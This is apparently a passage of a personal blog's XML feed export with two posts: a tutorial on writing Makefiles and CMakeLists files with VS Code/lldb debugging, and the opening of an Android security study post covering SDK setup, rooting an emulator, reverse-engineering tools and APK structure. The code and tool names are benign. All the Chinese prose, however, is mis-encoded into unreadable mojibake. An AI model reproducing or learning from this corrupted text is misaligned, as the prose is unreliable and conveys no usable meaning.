    <url>/2023/09/09/Cmake%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>ç¼–å†™è‡ªåŠ¨åŒ–æ„å»ºè„šæœ¬</p>
</blockquote>
<span id="more"></span>

<h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><p>åº”è¯¥å« GNU Makeï¼Œåœ¨Linux å¹³å°å¸¸ç”¨</p>
<p>æ‰“å°ä¿¡æ¯</p>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸æ˜¾ç¤ºä¸­é—´è¿‡ç¨‹ä»¥åŠå‘½ä»¤</span></span><br><span class="line">@echo <span class="string">&quot;begin make&quot;</span></span><br><span class="line">@<span class="variable">$(CXX)</span>  <span class="variable">$^</span> -o <span class="variable">$(TARGET)</span></span><br><span class="line">@echo <span class="string">&quot;build success&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŠ¥é”™å¤„ç†, æŠ¥é”™åä¸ä¼šå‘ä¸‹æ‰§è¡Œï¼Œæˆ‘ä»¬åœ¨å‰é¢åŠ ä¸Šä¸€ä¸ª `-` ç¬¦å·å°±è¡Œ</span></span><br></pre></td></tr></table></figure>

<p>é¡¹ç›®ç»“æ„</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hello/</span><br><span class="line">â”œâ”€â”€ main.cpp</span><br><span class="line">â”œâ”€â”€ factorial.cpp</span><br><span class="line">â”œâ”€â”€ printhello.cpp</span><br><span class="line">â””â”€â”€ functions.h</span><br></pre></td></tr></table></figure>
<p>æœ´ç´ ç‰ˆ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">g++ main.cpp factorial.cpp printhello.cpp -o main</span><br><span class="line">./main</span><br></pre></td></tr></table></figure>

<h3 id="version1"><a href="#version1" class="headerlink" title="version1"></a>version1</h3><p>tabè€Œä¸æ˜¯ç©ºæ ¼</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">hello: main.cpp printhello.cpp factorial.cpp</span></span><br><span class="line">	g++ -o hello main.cpp printhello.cpp factorial.cpp</span><br></pre></td></tr></table></figure>

<h3 id="version2"><a href="#version2" class="headerlink" title="version2"></a>version2</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line">OBJ = main.o printhello.o factorial.o</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$(TARGET)</span> <span class="variable">$(OBJ)</span></span><br><span class="line"></span><br><span class="line"><span class="section">main.o: main.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c main.cpp</span><br><span class="line"></span><br><span class="line"><span class="section">printhello.o: printhello.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c printhello.cpp</span><br><span class="line"></span><br><span class="line"><span class="section">factorial.o: factorial.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c factorial.cpp</span><br></pre></td></tr></table></figure>

<h3 id="version3"><a href="#version3" class="headerlink" title="version3"></a>version3</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line">OBJ = main.o printhello.o factorial.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wall warning all</span></span><br><span class="line">CXXFLAGS = -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHONY é¿å…å†²çªã€‚æ¯”å¦‚æœ‰ä¸€ä¸ª clean çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Ÿ</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<h3 id="version4"><a href="#version4" class="headerlink" title="version4"></a>version4</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶ä¸‹æ‰€æœ‰çš„cpp</span></span><br><span class="line">SRC = <span class="variable">$(<span class="built_in">wildcard</span> *.cpp)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„æ€ä¸º SRCä¸­çš„.cppæ›¿æ¢ä¸º.o</span></span><br><span class="line">OBJ = <span class="variable">$(<span class="built_in">patsubst</span> %.cpp, %.o, <span class="variable">$(SRC)</span>)</span></span><br><span class="line"></span><br><span class="line">CXXFLAGS = -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.cpp</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>
<h2 id="CMake"><a href="#CMake" class="headerlink" title="CMake"></a>CMake</h2><p>Linux å‘½ä»¤è¡Œï¼Œcmake <strong>ç”Ÿæˆ makefile</strong>ï¼Œç„¶ååœ¨ make ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cmake .</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>

<p>Windows å‘½ä»¤è¡Œ</p>
<ol>
<li>MinGW ç¯å¢ƒï¼Œä¸æ˜¯æˆ‘çš„é€‰æ‹©ï¼Œ MSVC</li>
<li>CMakeï¼Œé¦–å…ˆç”Ÿæˆç¼“å­˜ï¼Œæœ€åç¼–è¯‘</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">cmake <span class="literal">-B</span> build</span><br><span class="line">cmake <span class="literal">--build</span> build</span><br></pre></td></tr></table></figure>

<p>é…åˆ VsCode ä½¿ç”¨</p>
<p>Ctrl + shift + p è¿›å…¥å‘½ä»¤ ï¼š cmake build å°±èƒ½ç”Ÿæˆbuild ç›®å½•ï¼Œå‡ºç°æˆ‘ä»¬çš„éœ€è¦çš„exeæ–‡ä»¶</p>
<h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><p>æœ€ç®€å•çš„ CmakeLists</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ cmake ç‰ˆæœ¬è¦æ±‚ ]]</span></span><br><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ å·¥ç¨‹å ]]</span></span><br><span class="line"><span class="keyword">project</span> (<span class="keyword">test</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ å¯æ‰§è¡Œæ–‡ä»¶ ]]</span></span><br><span class="line"><span class="keyword">add_executable</span> (main main.cpp)</span><br></pre></td></tr></table></figure>

<p>set è®¾ç½®å˜é‡</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span>(SRC main.cpp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_executable</span> (main <span class="variable">$&#123;SRC&#125;</span>)</span><br></pre></td></tr></table></figure>

<p>C&#x2F;C++ æ ‡å‡† æ¯”å¦‚ <code>-std=c99</code></p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span>(CMAKE_C_STANDARD <span class="number">11</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD <span class="number">11</span>)</span><br></pre></td></tr></table></figure>

<p>file</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ åŒ¹é…æ‰€æœ‰çš„æ–‡ä»¶å ]]</span></span><br><span class="line"><span class="keyword">file</span>(GLOB &lt;variable&gt; [LIST_DIRECTORIES <span class="keyword">true</span>[<span class="keyword">false</span>]] [RELATIVE &lt;path&gt; ] [CONFIGURE_DEPENDS] [&lt;globbing-expression&gt; ...])</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ å°† /usr/lib/inlcude/ ä¸‹æ‰€æœ‰ cæ–‡ä»¶ èµ‹å€¼ç»™ SRC ]]</span></span><br><span class="line"><span class="keyword">file</span>(GLOB SRC /usr/lib/inlcude/*.c)</span><br></pre></td></tr></table></figure>

<p>å®</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ å½“å‰CMakeListsæ‰€åœ¨æ–‡ä»¶å¤¹ ]]</span></span><br><span class="line">CMAKE_CURRENT_SOURCE_DIR </span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ æœ€å¤–å±‚CMakeLists.txtæ‰€åœ¨ç›®å½• ]]</span></span><br><span class="line">CMAKE_SOURCE_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ ç¦» CMakeLists.txt æœ€è¿‘çš„ä¸€å±‚æ–‡ä»¶å¤¹ ]]</span></span><br><span class="line">PROJECT_SOURCE_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ äºŒè¿›åˆ¶æ–‡ä»¶è¾“å‡ºè·¯å¾„ï¼Œå¯è‡ªè¡Œset ]]</span></span><br><span class="line">EXECUTABLE_OUTPUT_PATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ åº“è¾“å‡ºè·¯å¾„ ]]</span></span><br><span class="line">LIBRARY_OUTPUT_PATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ ç¼–è¯‘å™¨ç¼–è¯‘é€‰é¡¹ ]]</span></span><br><span class="line">CMAKE_CXX_FLAGS</span><br></pre></td></tr></table></figure>

<p>æ‰“å°ä¿¡æ¯</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">message</span>()</span><br></pre></td></tr></table></figure>

<p>åˆ¶ä½œé“¾æ¥åº“</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add_library</span>(&lt;name&gt; [STATIC | SHARED | MODULE]</span><br><span class="line">            [EXCLUDE_FROM_ALL]</span><br><span class="line">            [source1] [source2 ...])</span><br><span class="line"><span class="comment">#[[ STATIC(é™æ€åº“) SHARED(åŠ¨æ€åº“) MODULE(æ¨¡å—åº“) ]]</span></span><br></pre></td></tr></table></figure>

<p>æ·»åŠ åº“ï¼Œç±»ä¼¼äº <code>gcc -lpthread</code></p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">target_link_libraries</span>(main pthread)</span><br></pre></td></tr></table></figure>

<h3 id="å¤šæ–‡ä»¶å¤¹"><a href="#å¤šæ–‡ä»¶å¤¹" class="headerlink" title="å¤šæ–‡ä»¶å¤¹"></a>å¤šæ–‡ä»¶å¤¹</h3><p>åŒ…å«å¤´æ–‡ä»¶</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include_directories</span>(<span class="variable">$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;</span>/<span class="keyword">include</span>/)</span><br></pre></td></tr></table></figure>

<p>åŒ…å«æºæ–‡ä»¶ï¼šfile</p>
<p>å¤šä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ¯”å¦‚ç®€å•çš„ web æœåŠ¡å™¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tree</span><br><span class="line">server</span><br><span class="line">|-- client</span><br><span class="line">|	|-- client.c</span><br><span class="line">|	|-- CMakeLists.txt</span><br><span class="line">|-- server</span><br><span class="line">|	|-- server.c</span><br><span class="line">|	|-- CMakeLists.txt</span><br><span class="line">|-- CMakeLists.txt</span><br></pre></td></tr></table></figure>


<p>æ·»åŠ å­ç›®å½•ï¼Œè¦æ±‚å­ç›®å½•å¿…é¡»å«æœ‰ CmakeLists.txt</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[[ åŒ…å«å­ç›®å½• ]]</span></span><br><span class="line"><span class="keyword">add_subdirectory</span>(client)</span><br></pre></td></tr></table></figure>

<p>æœ€å¤–å±‚</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (tftp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">add_subdirectory</span>(client)                </span><br><span class="line"><span class="keyword">add_subdirectory</span>(server)</span><br></pre></td></tr></table></figure>

<p>clent &amp; server</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (server)</span><br><span class="line"><span class="keyword">add_executable</span> (server server.cpp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[-----------------------------]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (client)</span><br><span class="line"><span class="keyword">add_executable</span> (client client.cpp)</span><br></pre></td></tr></table></figure>

<h3 id="ç¼–è¯‘æˆåº“"><a href="#ç¼–è¯‘æˆåº“" class="headerlink" title="ç¼–è¯‘æˆåº“"></a>ç¼–è¯‘æˆåº“</h3><p>å°†includeç¼–è¯‘æˆåº“ï¼Œç„¶ååœ¨ç¼–è¯‘æ—¶æŒ‡å®šåº“ (packet: ç½‘ç»œæ•°æ®åŒ…ï¼Œåœ¨client å’Œ server éƒ½ä¼šä½¿ç”¨)</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ADD_LIBRARY</span>(packet STATIC packet.cpp)</span><br></pre></td></tr></table></figure>

<p>é¡¹ç›®æ·»åŠ åŠ¨æ€é“¾æ¥åº“ï¼šåŒ…å«åº“ + äºŒè¿›åˆ¶æ–‡ä»¶é“¾æ¥</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">link_directories</span>(</span><br><span class="line">    <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/lib</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(client PUBLIC packet)</span><br></pre></td></tr></table></figure>

<h3 id="æ·»åŠ cppæ–‡ä»¶"><a href="#æ·»åŠ cppæ–‡ä»¶" class="headerlink" title="æ·»åŠ cppæ–‡ä»¶"></a>æ·»åŠ cppæ–‡ä»¶</h3><p>æˆ–è®¸æœ€ç®€å•ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–çš„å®å’Œå‡½æ•°è·å–cppæ–‡ä»¶æ·»åŠ </p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add_executable</span> (client client.cpp <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/packet/packet.cpp)</span><br></pre></td></tr></table></figure>

<h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><blockquote>
<p>ä¸»è¦æ˜¯åœ¨ vscode ä¸­é…åˆ LLVM å·¥å…·é“¾è¿›è¡Œdebugã€‚~~CLion å•¥éƒ½æœ‰ğŸ«¢ ~~</p>
</blockquote>
<p>ç¯å¢ƒï¼švscode + llvm + clangdæ’ä»¶ + code-lldbæ’ä»¶</p>
<ul>
<li>å†™å¥½ä¸€ä¸ªcmakeå·¥ç¨‹</li>
</ul>
<p>f5 è¿›è¡Œè°ƒè¯•ï¼Œéœ€è¦æ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ª <code>.vscode</code> æ–‡ä»¶å¤¹ï¼Œé…ç½®<code>launch.json</code>ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªå±æ€§ï¼š<code>program</code> ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶å°±è¡Œ</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">       <span class="punctuation">&#123;</span></span><br><span class="line">           <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lldb&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;windows&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/build/Debug/test.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span></span><br><span class="line">       <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="punctuation">]</span></span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>lldb æŒ‡ä»¤å’Œ gdb ç±»ä¼¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸‹é¢çš„ debug çª—å£ è¿›è¡Œå•æ­¥æ‰§è¡Œ</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>cmake</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-1</title>
    <url>/2023/10/08/Android-1/</url>
    <content><![CDATA[<blockquote>
<p>ä¸è¯¥ç‚¹å¼€é‚£ä¸€ç¯‡æ¨æ–‡ã€‚</p>
</blockquote>
<span id="more"></span>

<p>è…¾è®¯ç„æ­¦å®éªŒå®¤ä¸€ç¯‡å…³äºARM çš„æ–‡ç« ï¼š<a href="https://8ksec.io/arm64-reversing-and-exploitation-part-7-bypassing-aslr-and-nx/">ARM64 Reversing And Exploitation Part 7 â€“ Bypassing ASLR and NX - 8kSec</a></p>
<p>çœ‹äº†è¿™ç¯‡æ–‡ç« ï¼Œçªç„¶æƒ³å­¦ä¸€å­¦å®‰å“å®‰å…¨ç›¸å…³çš„å†…å®¹</p>
<h2 id="Android-ç¯å¢ƒæ­å»º"><a href="#Android-ç¯å¢ƒæ­å»º" class="headerlink" title="Android ç¯å¢ƒæ­å»º"></a>Android ç¯å¢ƒæ­å»º</h2><h3 id="SDK"><a href="#SDK" class="headerlink" title="SDK"></a>SDK</h3><p>åœ¨windows å’Œ Linux ä¸‹æ­å»ºã€‚æ¯”è¾ƒç®€å•çš„æ–¹å¼ï¼šä½¿ç”¨Android Studio</p>
<ol>
<li>ä¸‹è½½ Javaï¼Œé…ç½®ç¯å¢ƒå˜é‡ã€‚</li>
</ol>
<p>Linux ä½¿ç”¨åŒ…ç®¡ç†å™¨è¿›è¡Œå®‰è£…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># linux</span></span><br><span class="line">sudo apt install openjdk-17-jdk</span><br></pre></td></tr></table></figure>

<p>windows ä¸‹åœ¨oracleä¸‹è½½ <a href="https://www.oracle.com/java/technologies/downloads/">Java Downloads | Oracle</a>ï¼Œç„¶åé…ç½®</p>
<ol start="2">
<li>ä¸‹è½½android studioï¼Œä½¿ç”¨<a href="https://www.jetbrains.com/zh-cn/lp/toolbox/">JetBrains Toolbox</a></li>
<li>ä¸‹è½½ Android SDKï¼ŒAndroid studio æ‰“å¼€åå¦‚æœæ²¡æœ‰sdkä¼šè‡ªè¡Œä¸‹è½½ï¼Œä½†æ˜¯æœ‰å¢™ï¼Œä¸ä¸€å®šä¼šä¸‹è½½æˆåŠŸï¼Œä½†æ˜¯æ€»æœ‰è§£å†³é—®é¢˜çš„æ–¹æ³•ï¼ˆ</li>
<li>path: ä¸‹è½½sdkåï¼Œå°† <code>xxx\platform-tools</code> åŠ å…¥ç¯å¢ƒå˜é‡ï¼Œå°±å¯ä»¥ä½¿ç”¨adbã€‚ç¿»ç¿»ä¸‹è½½çš„ç›®å½•ï¼Œå¯èƒ½æœ‰å…¶ä½™æœ‰è¶£çš„å·¥å…·ï¼Œæ¯”å¦‚qemu</li>
</ol>
<h3 id="è¿è¡Œapk"><a href="#è¿è¡Œapk" class="headerlink" title="è¿è¡Œapk"></a>è¿è¡Œapk</h3><ol>
<li>æ¨¡æ‹Ÿå™¨</li>
</ol>
<p>å®‰è£… WSL2 åå¯¼è‡´å¤§éƒ¨åˆ†æ¨¡æ‹Ÿå™¨ä¸èƒ½ä½¿ç”¨ï¼Œ<del>å¯ä»¥å®‰è£…WSA</del>(WSAåœ¨2024å¹´3æœˆå®£å¸ƒåœæ­¢æ”¯æŒ)ï¼Œä½†æ˜¯ä¸‡ä¸€å­˜åœ¨ æ¶æ„è½¯ä»¶ å°±ä¼šå¾ˆéš¾æ</p>
<p><a href="https://www.bluestacks.cn/">BlueStackså®‰å“æ¨¡æ‹Ÿå™¨</a>ï¼Œé…ç½®åï¼Œä»¥<strong>ç®¡ç†å‘˜è¿è¡Œ</strong>ï¼Œä¸ä¼šå¤±è´¥</p>
<ul>
<li>rootï¼šæˆ‘åœ¨ä¿®æ”¹äº†é…ç½®æ–‡ä»¶åå°±æˆåŠŸäº†ã€‚<a href="https://appuals.com/root-bluestacks/">How to Root Bluestacks on Windows Easily?</a></li>
</ul>
<p>ä½†æ˜¯ç°åœ¨å­˜åœ¨å¯¹åº”çš„é€‰é¡¹ï¼Œåªéœ€è¦åœ¨è®¾ç½®é‡Œé¢å‹¾é€‰ä¸€ä¸‹å°±è¡Œã€‚</p>
<ol>
<li>root çœŸæœºï¼Œè¿™ä¸ªæ‰æ˜¯æœ€å¥½çš„æ–¹æ³•ã€‚<del>ä½†æ˜¯ä¹°ä¸èµ·</del></li>
</ol>
<ul>
<li>æ¨èï¼Œå› ä¸ºæœ‰çš„ä¸ç»™å‡ºx86çš„libåº“</li>
<li>å¯ä»¥åœ¨å¹³å°ä¹°ä¸ªäºŒæ‰‹çš„æ‰‹æœºï¼ˆxé±¼ï¼Œpixel</li>
</ul>
<h2 id="é€†å‘å·¥å…·"><a href="#é€†å‘å·¥å…·" class="headerlink" title="é€†å‘å·¥å…·"></a>é€†å‘å·¥å…·</h2><h3 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h3><ul>
<li><a href="https://github.com/skylot/jadx">jadx</a></li>
<li><a href="https://www.pnfsoftware.com/jeb/">JEB Decompiler</a></li>
<li><a href="https://hex-rays.com/IDA-pro/">IDA Pro</a></li>
<li><a href="https://github.com/NationalSecurityAgency/ghidra">ghidra</a></li>
</ul>
<h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><ul>
<li><a href="https://pypi.org/project/frida-tools/">frida-tools</a></li>
<li><a href="https://github.com/frida/frida/releases">firda server</a></li>
<li>xpose</li>
</ul>
<h3 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h3><h2 id="APKç»“æ„"><a href="#APKç»“æ„" class="headerlink" title="APKç»“æ„"></a>APKç»“æ„</h2><ul>
<li>APK, æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªzipæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æ–‡ä»¶åç¼€ç„¶åè§£å‹ã€‚</li>
</ul>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>ç”¨äºå­˜æ”¾éœ€è¦æ‰“åŒ…åˆ°APKä¸­çš„é™æ€æ–‡ä»¶</p>
<p>assetsç›®å½•<strong>æ”¯æŒä»»æ„æ·±åº¦çš„å­ç›®å½•</strong>ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚ä»»æ„éƒ¨ç½²æ–‡ä»¶å¤¹æ¶æ„ã€‚</p>
<h3 id="META-INF"><a href="#META-INF" class="headerlink" title="META-INF"></a>META-INF</h3><p>å­˜æ”¾çš„æ˜¯ç­¾åä¿¡æ¯ï¼Œç”¨æ¥ä¿è¯apkåŒ…çš„å®Œæ•´æ€§å’Œç³»ç»Ÿçš„å®‰å…¨ã€‚</p>
<p>åœ¨ç¼–è¯‘ç”Ÿæˆä¸€ä¸ªapkåŒ…æ—¶ï¼Œä¼šå¯¹æ‰€æœ‰è¦æ‰“åŒ…çš„æ–‡ä»¶åšä¸€ä¸ªæ ¡éªŒè®¡ç®—ï¼Œå¹¶æŠŠè®¡ç®—ç»“æœæ”¾åœ¨META-INFç›®å½•ä¸‹ã€‚åœ¨å®‰è£…æ—¶ï¼Œå¦‚æœæ ¡éªŒç»“æœä¸META-INFä¸‹çš„å†…å®¹ä¸ä¸€è‡´ï¼Œç³»ç»Ÿå°±ä¸ä¼šå®‰è£…è¿™ä¸ªapkã€‚ä»è€Œä¿è¯äº†apkåŒ…é‡Œçš„æ–‡ä»¶ä¸èƒ½è¢«éšæ„æ›¿æ¢ã€‚</p>
<p>META-INFç›®å½•ä¸‹åŒ…å«çš„æ–‡ä»¶æœ‰CERT.RSAï¼ŒCERT.DSAï¼ŒCERT.SFå’ŒMANIFEST.MF</p>
<ul>
<li>CERT.RSAï¼šæ˜¯å¼€å‘è€…åˆ©ç”¨ç§é’¥å¯¹APKè¿›è¡Œç­¾åçš„ç­¾åæ–‡ä»¶</li>
<li>CERT.SFï¼ŒMANIFEST.MFï¼šè®°å½•äº†æ–‡ä»¶ä¸­æ–‡ä»¶çš„å“ˆå¸Œå€¼</li>
</ul>
<h3 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h3><p>è¿™é‡Œå­˜æ”¾åº”ç”¨ç¨‹åºä¾èµ–çš„<strong>nativeåº“æ–‡ä»¶</strong>ï¼Œä¸€èˆ¬æ˜¯ç”¨C&#x2F;C++ç¼–å†™ï¼Œè¿™é‡Œçš„libåº“å¯èƒ½åŒ…å«å¤šç§ä¸åŒç±»å‹ï¼Œå¤§ä½“å¯ä»¥åˆ†ä¸ºARMï¼ŒX86ç­‰æ¶æ„ã€‚</p>
<h3 id="res"><a href="#res" class="headerlink" title="res"></a>res</h3><p>resæ˜¯resourceçš„ç¼©å†™ï¼Œè¿™ä¸ªç›®å½•å­˜æ”¾èµ„æºæ–‡ä»¶ï¼Œå­˜åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šæ˜ å°„åˆ°Androidå·¥ç¨‹çš„<code>.R</code>æ–‡ä»¶ä¸­ï¼Œç”Ÿæˆå¯¹åº”çš„IDï¼Œè®¿é—®çš„æ—¶å€™ç›´æ¥ä½¿ç”¨èµ„æºIDå³R.id.filenameï¼Œresæ–‡ä»¶å¤¹ä¸‹å¯ä»¥åŒ…å«å¤šä¸ªæ–‡ä»¶å¤¹ã€‚</p>
<p><strong>resæ–‡ä»¶å¤¹ï¼Œå­˜æ”¾çš„ä¹Ÿæ˜¯èµ„æºæ–‡ä»¶ï¼Œä¸assetsæ–‡ä»¶å¤¹ä¸åŒçš„æ˜¯ï¼Œè¿™é‡Œæ˜¯ç¼–è¯‘åçš„èµ„æºæ–‡ä»¶ã€‚</strong></p>
